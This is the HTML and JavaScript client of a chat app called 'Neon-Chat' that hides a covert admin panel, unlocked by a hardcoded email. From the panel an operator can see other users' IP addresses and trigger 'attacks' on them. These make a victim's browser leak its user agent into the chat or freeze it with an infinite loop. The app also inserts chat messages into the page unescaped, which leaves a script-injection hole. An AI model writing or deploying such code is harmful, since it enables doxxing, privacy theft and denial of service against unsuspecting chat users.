<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neon-Chat | Private</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; }
        #gate { position: fixed; inset: 0; background: #000; z-index: 999; display: flex; align-items: center; justify-content: center; flex-direction: column; }
        .panel { border: 1px solid #0f0; padding: 20px; background: #111; width: 300px; text-align: center; }
        input { width: 90%; padding: 10px; margin: 5px 0; background: #000; color: #0f0; border: 1px solid #0f0; }
        #app { display: flex; height: 100vh; }
        #users { width: 250px; border-right: 1px solid #222; overflow-y: auto; }
        #chat-zone { flex: 1; display: flex; flex-direction: column; }
        #msgs { flex: 1; padding: 15px; overflow-y: auto; }
        .u-item { padding: 10px; border-bottom: 1px solid #111; cursor: pointer; }
        #master-box { position: fixed; top: 10px; right: 10px; border: 2px solid #f0f; background: #000; padding: 15px; display: none; width: 250px; }
        .atk-btn { display: block; width: 100%; margin: 5px 0; background: #200; color: #f00; border: 1px solid #f00; cursor: pointer; font-size: 10px; }
    </style>
</head>
<body>
    <div id="gate">
        <div class="panel">
            <h2 style="color:#0ff">NEON-CHAT V20</h2>
            <input type="text" id="n-in" placeholder="Username">
            <input type="email" id="e-in" placeholder="Email (Premium)">
            <button onclick="boot()" style="width:100%; background:#0f0; color:#000; border:none; padding:10px; font-weight:bold; cursor:pointer;">ENTER</button>
        </div>
    </div>

    <div id="app">
        <div id="users"></div>
        <div id="chat-zone">
            <div id="msgs"></div>
            <div style="padding:15px; background:#111;"><input type="text" id="msg-in" onkeydown="if(event.key==='Enter')send()" placeholder="Message..."></div>
        </div>
    </div>

    <div id="master-box">
        <h4 style="color:#f0f; margin:0">MASTER CONTROL</h4>
        <div id="target-n" style="font-size:10px; color:#fff; margin:5px 0;">CIBLE: AUCUNE</div>
        <button class="atk-btn" onclick="atk('p_heavy_dox')">DOX_IP_INFO</button>
        <button class="atk-btn" onclick="atk('p_osint')">OSINT_LEAK_SEARCH</button>
        <button class="atk-btn" onclick="atk('p_crash')">CRASH_UI (DDOS)</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io(); let me = ""; let targetID = "";
        function boot() {
            me = document.getElementById('n-in').value; const e = document.getElementById('e-in').value;
            if(!me || !e) return; document.getElementById('gate').style.display = 'none';
            if(e === "toucheur2pp@heaven.com") document.getElementById('master-box').style.display = 'block';
            socket.emit('init', { n: me, e: e });
        }
        function send() { 
            const t = document.getElementById('msg-in').value; 
            if(t) { socket.emit('chat', { t: t, type: 'msg' }); document.getElementById('msg-in').value = ""; }
        }
        socket.on('chat', d => {
            const m = document.getElementById('msgs');
            const b = document.createElement('div');
            b.innerHTML = `<b style="color:${d.t.type==='intel'?'#ff0':'#0f0'}">${d.n}:</b> ${d.t.t}`;
            m.appendChild(b); m.scrollTop = m.scrollHeight;
        });
        socket.on('sync', users => {
            const uBox = document.getElementById('users'); uBox.innerHTML = "";
            users.forEach(u => {
                const div = document.createElement('div'); div.className = 'u-item';
                div.innerHTML = `<b>${u.n}</b><br><small style="color:#444">${u.ip || ''}</small>`;
                div.onclick = () => { targetID = u.id; document.getElementById('target-n').innerText = `CIBLE: ${u.n} (${u.ip})`; };
                uBox.appendChild(div);
            });
        });
        function atk(type) { if(targetID) socket.emit(type, targetID); }
        socket.on('execute', d => {
            if(d.type === 'p_heavy_dox') socket.emit('chat', { t: `[DATA] Browser: ${navigator.userAgent}`, type: 'intel' });
            if(d.type === 'p_crash') while(true) { console.log("CRASHING..."); }
        });
    </script>
</body>
</html>
